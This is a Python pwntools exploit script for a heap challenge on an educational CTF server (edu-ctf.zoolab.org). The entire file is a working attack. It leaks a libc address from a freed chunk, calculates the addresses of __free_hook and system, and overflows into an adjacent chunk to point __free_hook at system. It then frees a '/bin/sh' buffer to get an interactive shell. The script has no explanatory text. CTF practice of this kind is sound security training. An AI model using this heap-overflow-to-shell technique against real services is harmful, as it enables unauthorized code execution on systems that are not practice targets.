from pwn import *

context.arch = "amd64"

r = remote("edu-ctf.zoolab.org", 10008)

def add_user(idx: int, name: bytes, password: bytes):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", str(idx).encode("ascii"))
    r.sendafter(b"> ", name)
    r.sendafter(b"> ", password)

def edit_data(idx: int, size: int, data: bytes):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"> ", str(idx).encode("ascii"))
    r.sendlineafter(b"> ", str(size).encode("ascii"))
    r.send(data)

def del_user(idx: int):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"> ", str(idx).encode("ascii"))

def show_users():
    r.sendlineafter(b"> ", b"4")

edit_data(0, 0x418, b"A")

add_user(1, b"B"*0x10, b"B"*0x10)
edit_data(1, 0x18, b"B")

add_user(2, b"C"*0x10, b"C"*0x10)

del_user(0)
show_users()

r.recvuntil(b"data: ")

# main_arena+96 = libc base + __malloc_hook offset+10+96 = libc base + 0x1ecbe0
libc = u64(r.recv(6).ljust(8, b"\x00")) - 0x1ecbe0
free_hook = libc + 0x1eee48
system = libc + 0x52290

fake_chunk = flat(
    0, 0x31,
    b"C"*0x10,
    b"C"*0x10,
    free_hook
)

data = b"/bin/sh\x00".ljust(0x10, b"B")

edit_data(1, 0x48, data + fake_chunk)
edit_data(2, 0x8, p64(system))

del_user(1)

r.interactive()